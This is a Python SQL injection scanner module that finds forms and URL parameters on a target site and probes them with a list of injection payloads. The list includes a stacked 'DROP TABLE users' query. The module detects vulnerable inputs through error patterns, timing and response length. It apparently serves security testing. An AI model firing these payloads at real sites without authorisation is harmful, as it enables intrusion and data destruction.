"""
SQL Injection Testing Module

Part of OWASP Top 10 A03:2021 - Injection
Tests for SQL injection vulnerabilities in web applications.
"""

import logging
import requests
import time
import re
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

logger = logging.getLogger(__name__)


class SQLInjectionTester:
    """SQL Injection vulnerability tester"""

    # SQL Injection test payloads
    SQLI_PAYLOADS = [
        # Boolean-based blind SQL injection
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",

        # Time-based blind SQL injection
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT pg_sleep(5)--",

        # Union-based SQL injection
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",

        # Error-based SQL injection
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,database()))--",

        # Stacked queries
        "'; DROP TABLE users--",
        "'; SELECT * FROM users--",

        # Numeric injection
        "1 OR 1=1",
        "1' OR '1'='1",
        "1 AND 1=1",
    ]

    # Error patterns indicating SQL injection
    SQL_ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc\.exceptions",

        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"org\.postgresql\.util\.PSQLException",

        # MSSQL
        r"Driver.*SQL Server",
        r"OLE DB.*SQL Server",
        r"SQL Server.*Driver",
        r"Warning.*mssql_.*",
        r"Microsoft SQL Native Client error",
        r"Msg \d+, Level \d+, State \d+",
        r"Unclosed quotation mark after the character string",
        r"ODBC SQL Server Driver",

        # Oracle
        r"ORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_.*",
        r"Warning.*\Wora_.*",

        # SQLite
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_.*",
        r"unrecognized token:",

        # Generic
        r"syntax error.*SQL",
        r"SQL.*injection",
        r"SQLSTATE\[\d+\]",
        r"quoted string not properly terminated",
    ]

    def __init__(self, target_url: str, timeout: int = 10):
        """
        Initialize SQL injection tester

        Args:
            target_url: Target URL to test
            timeout: Request timeout in seconds
        """
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'XSS-Assistant/0.1.0 (Security Testing)',
        })

    def discover_endpoints(self) -> List[Dict[str, Any]]:
        """
        Discover testable endpoints (forms, URL parameters)

        Returns:
            List of endpoint information
        """
        logger.info(f"Discovering SQL injection test points on {self.target_url}")
        endpoints = []

        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            html = response.text

            # Find forms
            forms = self._parse_forms(html)
            endpoints.extend(forms)

            # Find URL parameters
            if '?' in self.target_url:
                params = self._parse_url_params(self.target_url)
                endpoints.append({
                    'type': 'url_parameter',
                    'url': self.target_url,
                    'parameters': params,
                    'method': 'GET'
                })

            logger.info(f"Discovered {len(endpoints)} SQL injection test points")

        except Exception as e:
            logger.error(f"Endpoint discovery failed: {e}")

        return endpoints

    def _parse_forms(self, html: str) -> List[Dict[str, Any]]:
        """Parse HTML forms"""
        forms = []

        # Simple regex-based form parsing
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.finditer(form_pattern, html, re.DOTALL | re.IGNORECASE)

        for match in form_matches:
            form_html = match.group(0)

            # Extract action
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            action = action_match.group(1) if action_match else ''

            # Extract method
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else 'GET'

            # Extract inputs
            input_pattern = r'<input[^>]*>'
            inputs = []
            for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                input_html = input_match.group(0)

                name_match = re.search(r'name=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
                type_match = re.search(r'type=["\']([^"\']*)["\']', input_html, re.IGNORECASE)

                if name_match:
                    inputs.append({
                        'name': name_match.group(1),
                        'type': type_match.group(1) if type_match else 'text'
                    })

            if inputs:
                forms.append({
                    'type': 'form',
                    'action': urljoin(self.target_url, action),
                    'method': method,
                    'inputs': inputs
                })

        return forms

    def _parse_url_params(self, url: str) -> List[Dict[str, str]]:
        """Parse URL parameters"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        return [
            {'name': key, 'value': values[0] if values else ''}
            for key, values in params.items()
        ]

    def test_endpoint(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Test an endpoint with SQL injection payloads

        Args:
            endpoint: Endpoint information

        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        endpoint_type = endpoint.get('type')

        logger.info(f"Testing SQL injection on {endpoint_type}: {endpoint.get('action') or endpoint.get('url')}")

        if endpoint_type == 'form':
            vulnerabilities = self._test_form(endpoint)
        elif endpoint_type == 'url_parameter':
            vulnerabilities = self._test_url_params(endpoint)

        return vulnerabilities

    def _test_form(self, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form inputs with SQL injection payloads"""
        vulnerabilities = []

        action = form['action']
        method = form['method']
        inputs = form['inputs']

        for input_field in inputs:
            input_name = input_field['name']

            # Skip password fields for ethical reasons
            if input_field['type'].lower() == 'password':
                continue

            logger.info(f"Testing input: {input_name}")

            # Get baseline response
            baseline_data = {inp['name']: 'test' for inp in inputs}
            try:
                if method == 'POST':
                    baseline_response = self.session.post(action, data=baseline_data, timeout=self.timeout, allow_redirects=True)
                else:
                    baseline_response = self.session.get(action, params=baseline_data, timeout=self.timeout, allow_redirects=True)
                baseline_length = len(baseline_response.text)
                baseline_time = baseline_response.elapsed.total_seconds()
            except:
                continue

            for payload in self.SQLI_PAYLOADS[:8]:  # Test with first 8 payloads
                try:
                    # Prepare form data
                    data = {inp['name']: 'test' for inp in inputs}
                    data[input_name] = payload

                    # Send request
                    start_time = time.time()
                    if method == 'POST':
                        response = self.session.post(action, data=data, timeout=self.timeout, allow_redirects=True)
                    else:
                        response = self.session.get(action, params=data, timeout=self.timeout, allow_redirects=True)
                    response_time = time.time() - start_time

                    # Check for SQL errors
                    if self._check_sql_error(response.text):
                        vulnerability = {
                            'type': 'sqli_error_based',
                            'severity': 'critical',
                            'endpoint': action,
                            'method': method,
                            'parameter': input_name,
                            'payload': payload,
                            'evidence': self._extract_error_evidence(response.text),
                            'status_code': response.status_code
                        }
                        vulnerabilities.append(vulnerability)
                        logger.warning(f"SQL Injection FOUND (error-based): {input_name} vulnerable to: {payload[:50]}")
                        break

                    # Check for time-based blind SQL injection
                    if 'SLEEP' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload:
                        if response_time >= 4.5:  # Should delay ~5 seconds
                            vulnerability = {
                                'type': 'sqli_time_based',
                                'severity': 'high',
                                'endpoint': action,
                                'method': method,
                                'parameter': input_name,
                                'payload': payload,
                                'evidence': f"Response time: {response_time:.2f}s (expected: >5s)",
                                'status_code': response.status_code
                            }
                            vulnerabilities.append(vulnerability)
                            logger.warning(f"SQL Injection FOUND (time-based): {input_name} vulnerable to: {payload[:50]}")
                            break

                    # Check for boolean-based blind SQL injection
                    if ("OR '1'='1" in payload or "OR 1=1" in payload) and abs(len(response.text) - baseline_length) > 100:
                        vulnerability = {
                            'type': 'sqli_boolean_based',
                            'severity': 'high',
                            'endpoint': action,
                            'method': method,
                            'parameter': input_name,
                            'payload': payload,
                            'evidence': f"Response length difference: {abs(len(response.text) - baseline_length)} bytes",
                            'status_code': response.status_code
                        }
                        vulnerabilities.append(vulnerability)
                        logger.warning(f"SQL Injection FOUND (boolean-based): {input_name} vulnerable to: {payload[:50]}")
                        break

                    # Rate limiting
                    time.sleep(0.3)

                except Exception as e:
                    logger.debug(f"Error testing {input_name} with payload: {e}")

        return vulnerabilities

    def _test_url_params(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test URL parameters with SQL injection payloads"""
        vulnerabilities = []

        url = endpoint['url']
        parameters = endpoint['parameters']

        for param in parameters:
            param_name = param['name']
            logger.info(f"Testing URL parameter: {param_name}")

            # Get baseline
            try:
                baseline_response = self.session.get(url, timeout=self.timeout)
                baseline_length = len(baseline_response.text)
            except:
                continue

            for payload in self.SQLI_PAYLOADS[:8]:
                try:
                    # Parse URL and update parameter
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]

                    # Rebuild URL
                    new_query = urlencode(params, doseq=True)
                    test_url = parsed._replace(query=new_query).geturl()

                    # Send request
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                    response_time = time.time() - start_time

                    # Check for SQL errors
                    if self._check_sql_error(response.text):
                        vulnerability = {
                            'type': 'sqli_error_based',
                            'severity': 'critical',
                            'endpoint': url,
                            'method': 'GET',
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': self._extract_error_evidence(response.text),
                            'status_code': response.status_code
                        }
                        vulnerabilities.append(vulnerability)
                        logger.warning(f"SQL Injection FOUND (error-based): {param_name} vulnerable to: {payload[:50]}")
                        break

                    # Check for time-based
                    if 'SLEEP' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload:
                        if response_time >= 4.5:
                            vulnerability = {
                                'type': 'sqli_time_based',
                                'severity': 'high',
                                'endpoint': url,
                                'method': 'GET',
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f"Response time: {response_time:.2f}s",
                                'status_code': response.status_code
                            }
                            vulnerabilities.append(vulnerability)
                            logger.warning(f"SQL Injection FOUND (time-based): {param_name} vulnerable")
                            break

                    # Rate limiting
                    time.sleep(0.3)

                except Exception as e:
                    logger.debug(f"Error testing {param_name}: {e}")

        return vulnerabilities

    def _check_sql_error(self, response_text: str) -> bool:
        """Check if response contains SQL error messages"""
        for pattern in self.SQL_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def _extract_error_evidence(self, response_text: str, context_chars: int = 150) -> str:
        """Extract SQL error evidence from response"""
        for pattern in self.SQL_ERROR_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                idx = match.start()
                start = max(0, idx - context_chars)
                end = min(len(response_text), idx + context_chars)
                return response_text[start:end]
        return "SQL error detected"

    def run_full_scan(self) -> Dict[str, Any]:
        """
        Run complete SQL injection scan

        Returns:
            Scan results with all vulnerabilities found
        """
        logger.info(f"Starting full SQL injection scan on {self.target_url}")

        results = {
            'target': self.target_url,
            'endpoints_found': 0,
            'endpoints_tested': 0,
            'vulnerabilities': [],
            'status': 'completed'
        }

        try:
            # Discover endpoints
            endpoints = self.discover_endpoints()
            results['endpoints_found'] = len(endpoints)

            # Test each endpoint
            for endpoint in endpoints:
                vulnerabilities = self.test_endpoint(endpoint)
                results['vulnerabilities'].extend(vulnerabilities)
                results['endpoints_tested'] += 1

            logger.info(f"SQL injection scan completed: {len(results['vulnerabilities'])} vulnerabilities found")

        except Exception as e:
            logger.error(f"SQL injection scan failed: {e}")
            results['status'] = 'failed'
            results['error'] = str(e)

        return results
